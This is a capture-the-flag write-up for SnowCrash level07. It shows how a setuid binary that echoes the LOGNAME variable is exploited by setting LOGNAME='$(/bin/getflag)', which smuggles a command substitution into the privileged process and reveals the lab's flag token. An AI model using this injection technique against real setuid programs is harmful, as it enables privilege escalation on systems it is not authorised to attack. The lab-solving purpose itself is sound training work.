```
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile

level07@SnowCrash:~$ ./level07
level07

level07@SnowCrash:~$ strings level07
...
LOGNAME
/bin/echo %s
...
```
By experimenting a bit we determine that `echo` prints LOGNAME so by changing this env variable we can get the flag:
```
level07@SnowCrash:~$ export LOGNAME='$(/bin/getflag)'

level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
